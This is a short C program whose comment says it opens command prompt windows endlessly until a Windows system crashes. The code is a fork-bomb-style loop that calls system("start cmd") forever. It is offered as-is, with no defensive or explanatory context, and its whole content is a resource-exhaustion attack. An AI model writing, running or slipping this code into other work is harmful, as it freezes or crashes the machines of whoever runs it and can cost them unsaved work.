/* Opens an infinite number of command prompt window (CMD) untill the system crushes. 
Works on Windows OS only.*/

#include <stdlib.h>

main(){
    while(1){
        system("start cmd");
    }
}
